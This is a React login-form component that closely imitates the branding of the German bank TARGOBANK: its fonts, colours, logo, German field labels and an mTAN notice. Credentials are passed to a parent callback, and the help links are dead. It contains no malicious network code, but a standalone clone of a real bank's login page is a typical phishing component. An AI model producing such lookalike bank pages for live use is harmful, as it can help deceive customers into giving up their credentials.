import React, { useState, useEffect } from 'react';
import { Eye, EyeOff } from 'lucide-react';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  isLoading?: boolean;
  errorMessage?: string;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, isLoading = false, errorMessage }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isLoading) {
      onSubmit({ username, password });
    }
  };

  if (isMobile) {
    // Mobile Layout - Stack vertically
    return (
      <div>
        {/* Mobile Warning Section */}
        <div style={{
          backgroundColor: '#00b6ed',
          padding: '20px',
          width: '100%'
        }}>
          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '16px',
            color: 'black'
          }}>
            {/* Warning Icon */}
            <div style={{
              marginTop: '8px'
            }}>
              <img 
                src="/images/warning.svg" 
                alt="Warning" 
                style={{ 
                  height: '60px', 
                  width: 'auto',
                  filter: 'brightness(0)'
                }} 
              />
            </div>
            <div>
              <h3 style={{
                fontSize: '20px',
                fontWeight: 'bold',
                margin: '0 0 12px 0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Wichtiger Hinweis:
              </h3>
              <p style={{
                fontSize: '14px',
                lineHeight: '1.5',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Die mTAN, die TAN per SMS wird zum 1. Dezember abgeschaltet. Informieren Sie sich jetzt.
              </p>
            </div>
          </div>
        </div>

        {/* Mobile Login Form */}
        <div style={{
          backgroundColor: '#00b6ed',
          padding: '20px',
          width: '100%',
          display: 'flex',
          justifyContent: 'center',
          position: 'relative'
        }}>
          {/* Background Icon Watermark */}
          <div style={{
            position: 'absolute',
            top: '50%',
            right: '-10%',
            transform: 'translateY(-50%)',
            opacity: 0.15,
            pointerEvents: 'none',
            width: '300px',
            height: '300px',
            backgroundImage: `url("/images/targobank-icon-white.svg")`,
            backgroundSize: 'contain',
            backgroundRepeat: 'no-repeat',
            backgroundPosition: 'center'
          }} />

          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.7)',
            borderRadius: '8px',
            padding: '24px 20px',
            width: '100%',
            maxWidth: '400px',
            boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)',
            backdropFilter: 'blur(15px)',
            border: '1px solid rgba(255, 255, 255, 0.2)',
            position: 'relative',
            zIndex: 1
          }}>
            <h2 style={{
              fontSize: '28px',
              fontWeight: 'bold',
              color: '#003366',
              textAlign: 'center',
              margin: '0 0 20px 0',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Login
            </h2>

            <p style={{
              fontSize: '14px',
              color: '#666',
              margin: '0 0 20px 0',
              textAlign: 'left',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              * Pflichtfeld
            </p>

            <form onSubmit={handleSubmit}>
              {/* Username Field */}
              <div style={{ marginBottom: '16px' }}>
                <input
                  type="text"
                  placeholder="Benutzername *"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '12px',
                    height: '44px',
                    border: '2px solid #ddd',
                    borderRadius: '8px',
                    fontSize: '16px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                    outline: 'none',
                    transition: 'border-color 0.3s',
                    backgroundColor: 'white',
                    boxSizing: 'border-box'
                  }}
                  onFocus={(e) => e.currentTarget.style.borderColor = '#00bcd4'}
                  onBlur={(e) => e.currentTarget.style.borderColor = '#ddd'}
                />
              </div>

              {/* Password Field */}
              <div style={{ marginBottom: '16px', position: 'relative' }}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Passwort *"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '12px',
                    paddingRight: '50px',
                    height: '44px',
                    border: '2px solid #ddd',
                    borderRadius: '8px',
                    fontSize: '16px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                    outline: 'none',
                    transition: 'border-color 0.3s',
                    backgroundColor: 'white',
                    boxSizing: 'border-box'
                  }}
                  onFocus={(e) => e.currentTarget.style.borderColor = '#00bcd4'}
                  onBlur={(e) => e.currentTarget.style.borderColor = '#ddd'}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    color: '#666',
                    padding: '4px'
                  }}
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>

              {/* Error Message */}
              {errorMessage && (
                <div style={{
                  backgroundColor: '#fff3cd',
                  border: '1px solid #ffeaa7',
                  borderRadius: '6px',
                  padding: '12px',
                  marginBottom: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}>
                  <span style={{ color: '#856404', fontSize: '14px' }}>⚠️</span>
                  <span style={{
                    color: '#856404',
                    fontSize: '14px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    {errorMessage}
                  </span>
                </div>
              )}

              {/* Login Button */}
              <button
                type="submit"
                disabled={isLoading}
                style={{
                  width: '100%',
                  padding: '12px',
                  height: '44px',
                  backgroundColor: '#c20831',
                  color: 'white',
                  border: 'none',
                  borderRadius: '25px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.3s',
                  opacity: isLoading ? 0.7 : 1,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px'
                }}
                onMouseOver={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#a91e2c')}
                onMouseOut={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#c20831')}
              >
                {isLoading ? 'Wird geladen...' : 'Jetzt einloggen'}
                {!isLoading && <span style={{ fontSize: '18px' }}>→</span>}
              </button>

              {/* Links */}
              <div style={{
                marginTop: '20px',
                textAlign: 'center'
              }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between',
                  marginBottom: '8px',
                  flexWrap: 'wrap',
                  gap: '8px'
                }}>
                  <a href="#" onClick={(e) => e.preventDefault()} style={{
                    color: '#003366',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    Zugangsdaten vergessen?
                  </a>
                  <a href="#" onClick={(e) => e.preventDefault()} style={{
                    color: '#003366',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    Benutzerdaten anlegen
                  </a>
                </div>
                <div>
                  <a href="#" onClick={(e) => e.preventDefault()} style={{
                    color: '#003366',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    Informationen zur Einrichtung und Nutzung
                  </a>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // Desktop Layout
  return (
    <div style={{
      height: '600px',
      maxHeight: '600px',
      width: '100%',
      backgroundColor: '#00b6ed',
      position: 'relative',
      overflow: 'hidden',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center'
    }}>
      {/* Wichtiger Hinweis - Desktop positioning */}
      <div style={{
        position: 'absolute',
        left: '40px',
        top: '50%',
        transform: 'translateY(-50%)',
        zIndex: 10,
        maxWidth: '350px'
      }}>
        <div style={{
          display: 'flex',
          alignItems: 'flex-start',
          gap: '16px',
          color: 'black'
        }}>
          {/* Warning Icon */}
          <div style={{
            marginTop: '8px'
          }}>
            <img 
              src="/images/warning.svg" 
              alt="Warning" 
              style={{ 
                height: '80px', 
                width: 'auto',
                filter: 'brightness(0)'
              }} 
            />
          </div>
          <div>
            <h3 style={{
              fontSize: '24px',
              fontWeight: 'bold',
              margin: '0 0 16px 0',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Wichtiger Hinweis:
            </h3>
            <p style={{
              fontSize: '16px',
              lineHeight: '1.6',
              margin: '0',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Die mTAN, die TAN per SMS wird zum 1. Dezember abgeschaltet. Informieren Sie sich jetzt.
            </p>
          </div>
        </div>
      </div>

      {/* Background Icon Watermark - Large X icon on right side */}
      <div style={{
        position: 'absolute',
        top: '50%',
        right: '-5%',
        transform: 'translateY(-50%)',
        opacity: 0.15,
        pointerEvents: 'none',
        width: '800px',
        height: '800px',
        backgroundImage: `url("/images/targobank-icon-white.svg")`,
        backgroundSize: 'contain',
        backgroundRepeat: 'no-repeat',
        backgroundPosition: 'center'
      }} />

      {/* Centered Login Form */}
      <div style={{
        position: 'relative',
        zIndex: 1,
        width: '100%',
        maxWidth: '500px',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center'
      }}>
        <div style={{
          backgroundColor: 'rgba(255, 255, 255, 0.7)',
          borderRadius: '12px',
          padding: '32px 40px',
          width: '100%',
          maxWidth: '500px',
          boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)',
          backdropFilter: 'blur(15px)',
          border: '1px solid rgba(255, 255, 255, 0.2)'
        }}>
          <h2 style={{
            fontSize: '32px',
            fontWeight: 'bold',
            color: '#003366',
            textAlign: 'center',
            margin: '0 0 24px 0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Login
          </h2>

          <p style={{
            fontSize: '14px',
            color: '#666',
            margin: '0 0 24px 0',
            textAlign: 'left',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            * Pflichtfeld
          </p>

          <form onSubmit={handleSubmit}>
            {/* Username Field */}
            <div style={{ marginBottom: '16px' }}>
              <input
                type="text"
                placeholder="Benutzername *"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={{
                  width: '100%',
                  padding: '12px',
                  height: '44px',
                  border: '2px solid #ddd',
                  borderRadius: '8px',
                  fontSize: '16px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  outline: 'none',
                  transition: 'border-color 0.3s',
                  backgroundColor: 'white',
                  boxSizing: 'border-box'
                }}
                onFocus={(e) => e.currentTarget.style.borderColor = '#00bcd4'}
                onBlur={(e) => e.currentTarget.style.borderColor = '#ddd'}
              />
            </div>

            {/* Password Field */}
            <div style={{ marginBottom: '16px', position: 'relative' }}>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Passwort *"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  width: '100%',
                  padding: '12px',
                  paddingRight: '50px',
                  height: '44px',
                  border: '2px solid #ddd',
                  borderRadius: '8px',
                  fontSize: '16px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                  outline: 'none',
                  transition: 'border-color 0.3s',
                  backgroundColor: 'white',
                  boxSizing: 'border-box'
                }}
                onFocus={(e) => e.currentTarget.style.borderColor = '#00bcd4'}
                onBlur={(e) => e.currentTarget.style.borderColor = '#ddd'}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                style={{
                  position: 'absolute',
                  right: '12px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  color: '#666',
                  padding: '4px'
                }}
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {/* Error Message */}
            {errorMessage && (
              <div style={{
                backgroundColor: '#fff3cd',
                border: '1px solid #ffeaa7',
                borderRadius: '6px',
                padding: '12px',
                marginBottom: '24px',
                display: 'flex',
                alignItems: 'center',
                gap: '8px'
              }}>
                <span style={{ color: '#856404', fontSize: '14px' }}>⚠️</span>
                <span style={{
                  color: '#856404',
                  fontSize: '14px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                }}>
                  {errorMessage}
                </span>
              </div>
            )}

            {/* Login Button */}
            <button
              type="submit"
              disabled={isLoading}
              style={{
                width: '100%',
                padding: '12px',
                height: '44px',
                backgroundColor: '#c20831',
                color: 'white',
                border: 'none',
                borderRadius: '25px',
                fontSize: '16px',
                fontWeight: 'bold',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                transition: 'background-color 0.3s',
                opacity: isLoading ? 0.7 : 1,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px'
              }}
              onMouseOver={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#a91e2c')}
              onMouseOut={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#c20831')}
            >
              {isLoading ? 'Wird geladen...' : 'Jetzt einloggen'}
              {!isLoading && <span style={{ fontSize: '18px' }}>→</span>}
            </button>

            {/* Links */}
            <div style={{
              marginTop: '24px',
              textAlign: 'center'
            }}>
              <div style={{ 
                display: 'flex', 
                justifyContent: 'space-between',
                marginBottom: '8px',
                flexWrap: 'wrap',
                gap: '8px'
              }}>
                <a href="#" onClick={(e) => e.preventDefault()} style={{
                  color: '#003366',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                }}>
                  Zugangsdaten vergessen?
                </a>
                <a href="#" onClick={(e) => e.preventDefault()} style={{
                  color: '#003366',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                }}>
                  Benutzerdaten anlegen
                </a>
              </div>
              <div>
                <a href="#" onClick={(e) => e.preventDefault()} style={{
                  color: '#003366',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
                }}>
                  Informationen zur Einrichtung und Nutzung
                </a>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;

